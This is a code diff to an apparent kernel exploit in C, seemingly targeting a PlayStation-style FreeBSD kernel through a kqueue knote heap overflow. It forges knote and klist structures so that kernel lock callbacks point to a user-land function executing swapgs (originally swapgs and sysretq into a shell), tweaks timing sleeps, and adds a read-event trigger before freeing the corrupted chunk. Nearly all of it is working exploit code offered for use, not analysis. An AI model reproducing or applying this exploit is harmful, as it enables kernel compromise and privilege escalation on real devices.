@@ -42,7 +42,6 @@ struct knote {
 #define KN_MARKER	0x20			/* ignore this knote */
 #define KN_KQUEUE	0x40			/* this knote belongs to a kq */
 #define KN_HASKQLOCK	0x80			/* for _inevent */
-#define	KN_SCAN		0x100			/* flux set in kqueue_scan() */
 	int			kn_sfflags;	/* saved filter flags */
 	intptr_t		kn_sdata;	/* saved data field */
 	union {
@@ -50,8 +49,6 @@ struct knote {
 		struct		proc *p_proc;	/* proc pointer */
 		struct		aiocblist *p_aio;	/* AIO job pointer */
 		struct		aioliojob *p_lio;	/* LIO job pointer */
-		sbintime_t	*p_nexttime;	/* next timer event fires at */
-		void		*p_v;		/* generic other pointer */
 	} kn_ptr;
 	struct			filterops *kn_fop;
 	void			*kn_hook;
@@ -145,7 +142,13 @@ void run(void *arg) // no idea if this user land function is (can?) ever been ca
 
 void dummy(void *arg)
 {
-	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
+	printf("shell");
+	__asm__ volatile("swapgs;");
+	printf("shell");
+	fflush(stdout);
+	sleep(10);
+	__asm__ volatile("swapgs;");
+	//__asm__ volatile("swapgs; sysretq;"::"c"(shell));
 }
 
 /*
@@ -238,12 +241,13 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 
 	knist.kl_list.slh_first = &kote;
 
-	knist.kl_lock = run;
+	knist.kl_lock = dummy;
 	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
 	knist.kl_lockarg = NULL;
 
 	kote.kn_knlist = &knist;
-	kote.kn_link.sle_next = kote.kn_selnext.sle_next = &kote;
+	kote.kn_link.sle_next = &kote;
+	kote.kn_selnext.sle_next = NULL;
 	kote.kn_kevent.ident = fd;
 
 	kist = (struct klist *)(map + bufferSize);
@@ -256,9 +260,10 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 	printf("SYS_dynlib_prepare_dlclose: %i\n", r);
 
 	printf("wait ... ");
-	sleep(20);
+	sleep(0);
 	printf("go\n");
 	fflush(stdout);
+	sleep(2);
 
 /*
 	// free all intermediates - unless global fd - nothing happens here
@@ -272,14 +277,16 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 	}
 
 	printf("wait ... ");
-	sleep(0);
+	sleep(10);
 	printf("go\n");
 	fflush(stdout);
+	sleep(1);
 */
 
 	printf("Pre Trigger\n");
 	fflush(stdout);
 	// trigger + free
+	sceKernelAddReadEvent(overflowChunk, kexecGetGlobalFileDescriptor(), 5, NULL);
 	r = kexecFree(overflowChunk);
 	if(r < 0)
 		printf("kexecFree(overflowChunk) = %i\n", r);
